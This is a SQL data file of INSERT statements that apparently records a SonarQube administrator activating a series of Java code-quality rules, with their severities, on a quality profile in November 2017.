INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1381, '2017-11-20 10:14:50.723', 'admin', 'key=java-lena-qp_15-78480:squid:S2438;ruleKey=squid:S2438;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GBjbbGRdfPp-qzI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1382, '2017-11-20 10:14:50.752', 'admin', 'key=java-lena-qp_15-78480:squid:S2440;ruleKey=squid:S2440;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GCAbbGRdfPp-qzJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1383, '2017-11-20 10:14:50.786', 'admin', 'key=java-lena-qp_15-78480:squid:S2441;ruleKey=squid:S2441;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GCibbGRdfPp-qzK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1384, '2017-11-20 10:14:50.824', 'admin', 'key=java-lena-qp_15-78480:squid:S2442;ruleKey=squid:S2442;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GDIbbGRdfPp-qzL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1385, '2017-11-20 10:14:50.86', 'admin', 'key=java-lena-qp_15-78480:squid:S2445;ruleKey=squid:S2445;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GDsbbGRdfPp-qzM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1386, '2017-11-20 10:14:50.895', 'admin', 'key=java-lena-qp_15-78480:squid:S2446;ruleKey=squid:S2446;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GEPbbGRdfPp-qzN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1387, '2017-11-20 10:14:50.955', 'admin', 'key=java-lena-qp_15-78480:squid:S2447;ruleKey=squid:S2447;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GFLbbGRdfPp-qzO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1388, '2017-11-20 10:14:50.982', 'admin', 'key=java-lena-qp_15-78480:squid:S2583;ruleKey=squid:S2583;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GFmbbGRdfPp-qzP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1389, '2017-11-20 10:14:51.023', 'admin', 'key=java-lena-qp_15-78480:squid:S2589;ruleKey=squid:S2589;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GGPbbGRdfPp-qzQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1390, '2017-11-20 10:14:51.067', 'admin', 'key=java-lena-qp_15-78480:squid:S2629;ruleKey=squid:S2629;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GG7bbGRdfPp-qzR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1391, '2017-11-20 10:14:51.101', 'admin', 'key=java-lena-qp_15-78480:squid:S2637;ruleKey=squid:S2637;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GHdbbGRdfPp-qzS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1392, '2017-11-20 10:14:51.147', 'admin', 'key=java-lena-qp_15-78480:squid:S2638;ruleKey=squid:S2638;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GILbbGRdfPp-qzT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1393, '2017-11-20 10:14:51.203', 'admin', 'key=java-lena-qp_15-78480:squid:S2639;ruleKey=squid:S2639;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GJDbbGRdfPp-qzU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1394, '2017-11-20 10:14:51.247', 'admin', 'key=java-lena-qp_15-78480:squid:S2653;ruleKey=squid:S2653;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GJvbbGRdfPp-qzV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1395, '2017-11-20 10:14:51.3', 'admin', 'key=java-lena-qp_15-78480:squid:S2674;ruleKey=squid:S2674;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GKkbbGRdfPp-qzW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1396, '2017-11-20 10:14:51.361', 'admin', 'key=java-lena-qp_15-78480:squid:S2675;ruleKey=squid:S2675;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GLhbbGRdfPp-qzX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1397, '2017-11-20 10:14:51.448', 'admin', 'key=java-lena-qp_15-78480:squid:S2676;ruleKey=squid:S2676;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GM4bbGRdfPp-qzY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1398, '2017-11-20 10:14:51.475', 'admin', 'key=java-lena-qp_15-78480:squid:S2677;ruleKey=squid:S2677;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GNTbbGRdfPp-qzZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1399, '2017-11-20 10:14:51.518', 'admin', 'key=java-lena-qp_15-78480:squid:S2681;ruleKey=squid:S2681;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GN-bbGRdfPp-qza');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1400, '2017-11-20 10:14:51.555', 'admin', 'key=java-lena-qp_15-78480:squid:S2692;ruleKey=squid:S2692;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GOjbbGRdfPp-qzb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1401, '2017-11-20 10:14:51.58', 'admin', 'key=java-lena-qp_15-78480:squid:S2695;ruleKey=squid:S2695;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GO8bbGRdfPp-qzc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1402, '2017-11-20 10:14:51.603', 'admin', 'key=java-lena-qp_15-78480:squid:S2696;ruleKey=squid:S2696;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GPTbbGRdfPp-qzd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1403, '2017-11-20 10:14:51.641', 'admin', 'key=java-lena-qp_15-78480:squid:S2718;ruleKey=squid:S2718;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GP5bbGRdfPp-qze');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1404, '2017-11-20 10:14:51.683', 'admin', 'key=java-lena-qp_15-78480:squid:S2737;ruleKey=squid:S2737;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GQjbbGRdfPp-qzf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1405, '2017-11-20 10:14:51.741', 'admin', 'key=java-lena-qp_15-78480:squid:S2757;ruleKey=squid:S2757;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GRdbbGRdfPp-qzg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1406, '2017-11-20 10:14:51.785', 'admin', 'key=java-lena-qp_15-78480:squid:S2786;ruleKey=squid:S2786;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GSJbbGRdfPp-qzh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1407, '2017-11-20 10:14:51.826', 'admin', 'key=java-lena-qp_15-78480:squid:S2789;ruleKey=squid:S2789;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GSybbGRdfPp-qzi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1408, '2017-11-20 10:14:51.867', 'admin', 'key=java-lena-qp_15-78480:squid:S2864;ruleKey=squid:S2864;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GTbbbGRdfPp-qzj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1409, '2017-11-20 10:14:51.907', 'admin', 'key=java-lena-qp_15-78480:squid:S2885;ruleKey=squid:S2885;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GUDbbGRdfPp-qzk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1410, '2017-11-20 10:14:51.947', 'admin', 'key=java-lena-qp_15-78480:squid:S2886;ruleKey=squid:S2886;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GUrbbGRdfPp-qzl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1411, '2017-11-20 10:14:51.982', 'admin', 'key=java-lena-qp_15-78480:squid:S2912;ruleKey=squid:S2912;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GVObbGRdfPp-qzm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1412, '2017-11-20 10:14:52.02', 'admin', 'key=java-lena-qp_15-78480:squid:S2924;ruleKey=squid:S2924;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GV0bbGRdfPp-qzn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1413, '2017-11-20 10:14:52.059', 'admin', 'key=java-lena-qp_15-78480:squid:S2925;ruleKey=squid:S2925;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GWbbbGRdfPp-qzo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1414, '2017-11-20 10:14:52.097', 'admin', 'key=java-lena-qp_15-78480:squid:S2970;ruleKey=squid:S2970;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GXBbbGRdfPp-qzp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1415, '2017-11-20 10:14:52.136', 'admin', 'key=java-lena-qp_15-78480:squid:S2975;ruleKey=squid:S2975;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GXobbGRdfPp-qzq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1416, '2017-11-20 10:14:52.185', 'admin', 'key=java-lena-qp_15-78480:squid:S2976;ruleKey=squid:S2976;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GYZbbGRdfPp-qzr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1417, '2017-11-20 10:14:52.224', 'admin', 'key=java-lena-qp_15-78480:squid:S3008;ruleKey=squid:S3008;profileKey=java-lena-qp_15-78480;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GZAbbGRdfPp-qzs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1418, '2017-11-20 10:14:52.285', 'admin', 'key=java-lena-qp_15-78480:squid:S3010;ruleKey=squid:S3010;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GZ9bbGRdfPp-qzt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1419, '2017-11-20 10:14:52.347', 'admin', 'key=java-lena-qp_15-78480:squid:S3020;ruleKey=squid:S3020;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Ga7bbGRdfPp-qzu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1420, '2017-11-20 10:14:52.462', 'admin', 'key=java-lena-qp_15-78480:squid:S3027;ruleKey=squid:S3027;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GcubbGRdfPp-qzv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1421, '2017-11-20 10:14:52.535', 'admin', 'key=java-lena-qp_15-78480:squid:S3034;ruleKey=squid:S3034;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Gd3bbGRdfPp-qzw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1422, '2017-11-20 10:14:52.558', 'admin', 'key=java-lena-qp_15-78480:squid:S3038;ruleKey=squid:S3038;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GeObbGRdfPp-qzx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1423, '2017-11-20 10:14:52.593', 'admin', 'key=java-lena-qp_15-78480:squid:S3042;ruleKey=squid:S3042;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GexbbGRdfPp-qzy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1424, '2017-11-20 10:14:52.623', 'admin', 'key=java-lena-qp_15-78480:squid:S3046;ruleKey=squid:S3046;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GfPbbGRdfPp-qzz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1425, '2017-11-20 10:14:52.66', 'admin', 'key=java-lena-qp_15-78480:squid:S3066;ruleKey=squid:S3066;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Gf0bbGRdfPp-qz0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1426, '2017-11-20 10:14:52.693', 'admin', 'key=java-lena-qp_15-78480:squid:S3067;ruleKey=squid:S3067;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GgVbbGRdfPp-qz1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1427, '2017-11-20 10:14:52.729', 'admin', 'key=java-lena-qp_15-78480:squid:S3281;ruleKey=squid:S3281;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Gg5bbGRdfPp-qz2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1428, '2017-11-20 10:14:52.75', 'admin', 'key=java-lena-qp_15-78480:squid:S3346;ruleKey=squid:S3346;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GhObbGRdfPp-qz3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1429, '2017-11-20 10:14:52.788', 'admin', 'key=java-lena-qp_15-78480:squid:S3355;ruleKey=squid:S3355;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Gh0bbGRdfPp-qz4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1430, '2017-11-20 10:14:52.81', 'admin', 'key=java-lena-qp_15-78480:squid:S3358;ruleKey=squid:S3358;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GiKbbGRdfPp-qz5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1431, '2017-11-20 10:14:52.844', 'admin', 'key=java-lena-qp_15-78480:squid:S3398;ruleKey=squid:S3398;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GisbbGRdfPp-qz6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1432, '2017-11-20 10:14:52.88', 'admin', 'key=java-lena-qp_15-78480:squid:S3400;ruleKey=squid:S3400;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GjQbbGRdfPp-qz7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1433, '2017-11-20 10:14:52.907', 'admin', 'key=java-lena-qp_15-78480:squid:S3415;ruleKey=squid:S3415;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GjrbbGRdfPp-qz8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1434, '2017-11-20 10:14:52.932', 'admin', 'key=java-lena-qp_15-78480:squid:S3421;ruleKey=squid:S3421;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GkEbbGRdfPp-qz9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1435, '2017-11-20 10:14:52.965', 'admin', 'key=java-lena-qp_15-78480:squid:S3422;ruleKey=squid:S3422;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GklbbGRdfPp-qz-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1436, '2017-11-20 10:14:53.006', 'admin', 'key=java-lena-qp_15-78480:squid:S3436;ruleKey=squid:S3436;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GlObbGRdfPp-qz_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1437, '2017-11-20 10:14:53.035', 'admin', 'key=java-lena-qp_15-78480:squid:S3437;ruleKey=squid:S3437;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GlrbbGRdfPp-q0A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1438, '2017-11-20 10:14:53.059', 'admin', 'key=java-lena-qp_15-78480:squid:S3438;ruleKey=squid:S3438;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GmDbbGRdfPp-q0B');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1439, '2017-11-20 10:14:53.084', 'admin', 'key=java-lena-qp_15-78480:squid:S3457;ruleKey=squid:S3457;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GmcbbGRdfPp-q0C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1440, '2017-11-20 10:14:53.111', 'admin', 'key=java-lena-qp_15-78480:squid:S3516;ruleKey=squid:S3516;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Gm3bbGRdfPp-q0D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1441, '2017-11-20 10:14:53.148', 'admin', 'key=java-lena-qp_15-78480:squid:S3518;ruleKey=squid:S3518;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GncbbGRdfPp-q0E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1442, '2017-11-20 10:14:53.193', 'admin', 'key=java-lena-qp_15-78480:squid:S3599;ruleKey=squid:S3599;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GoJbbGRdfPp-q0F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1443, '2017-11-20 10:14:53.223', 'admin', 'key=java-lena-qp_15-78480:squid:S3631;ruleKey=squid:S3631;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GonbbGRdfPp-q0G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1444, '2017-11-20 10:14:53.276', 'admin', 'key=java-lena-qp_15-78480:squid:S3655;ruleKey=squid:S3655;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GpcbbGRdfPp-q0H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1445, '2017-11-20 10:14:53.336', 'admin', 'key=java-lena-qp_15-78480:squid:S3725;ruleKey=squid:S3725;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GqYbbGRdfPp-q0I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1446, '2017-11-20 10:14:53.38', 'admin', 'key=java-lena-qp_15-78480:squid:S3776;ruleKey=squid:S3776;profileKey=java-lena-qp_15-78480;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GrEbbGRdfPp-q0J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1447, '2017-11-20 10:14:53.47', 'admin', 'key=java-lena-qp_15-78480:squid:S3824;ruleKey=squid:S3824;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GsebbGRdfPp-q0K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1448, '2017-11-20 10:14:53.526', 'admin', 'key=java-lena-qp_15-78480:squid:S3878;ruleKey=squid:S3878;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GtWbbGRdfPp-q0L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1449, '2017-11-20 10:14:53.555', 'admin', 'key=java-lena-qp_15-78480:squid:S3923;ruleKey=squid:S3923;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GtzbbGRdfPp-q0M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1450, '2017-11-20 10:14:53.582', 'admin', 'key=java-lena-qp_15-78480:squid:S3958;ruleKey=squid:S3958;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GuObbGRdfPp-q0N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1451, '2017-11-20 10:14:53.614', 'admin', 'key=java-lena-qp_15-78480:squid:S3959;ruleKey=squid:S3959;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GuubbGRdfPp-q0O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1452, '2017-11-20 10:14:53.642', 'admin', 'key=java-lena-qp_15-78480:squid:S3972;ruleKey=squid:S3972;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GvKbbGRdfPp-q0P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1453, '2017-11-20 10:14:53.679', 'admin', 'key=java-lena-qp_15-78480:squid:S3981;ruleKey=squid:S3981;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GvvbbGRdfPp-q0Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1454, '2017-11-20 10:14:53.725', 'admin', 'key=java-lena-qp_15-78480:squid:S3984;ruleKey=squid:S3984;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GwdbbGRdfPp-q0R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1455, '2017-11-20 10:14:53.761', 'admin', 'key=java-lena-qp_15-78480:squid:S3985;ruleKey=squid:S3985;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GxBbbGRdfPp-q0S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1456, '2017-11-20 10:14:53.8', 'admin', 'key=java-lena-qp_15-78480:squid:S3986;ruleKey=squid:S3986;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GxobbGRdfPp-q0T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1457, '2017-11-20 10:14:53.858', 'admin', 'key=java-lena-qp_15-78480:squid:S4032;ruleKey=squid:S4032;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GyibbGRdfPp-q0U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1458, '2017-11-20 10:14:53.897', 'admin', 'key=java-lena-qp_15-78480:squid:S4034;ruleKey=squid:S4034;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GzJbbGRdfPp-q0V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1459, '2017-11-20 10:14:53.936', 'admin', 'key=java-lena-qp_15-78480:squid:S4042;ruleKey=squid:S4042;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7GzwbbGRdfPp-q0W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1460, '2017-11-20 10:14:53.976', 'admin', 'key=java-lena-qp_15-78480:squid:S4065;ruleKey=squid:S4065;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G0YbbGRdfPp-q0X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1461, '2017-11-20 10:14:54.013', 'admin', 'key=java-lena-qp_15-78480:squid:S4087;ruleKey=squid:S4087;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G09bbGRdfPp-q0Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1462, '2017-11-20 10:14:54.048', 'admin', 'key=java-lena-qp_15-78480:squid:S4143;ruleKey=squid:S4143;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7G1gbbGRdfPp-q0Z');
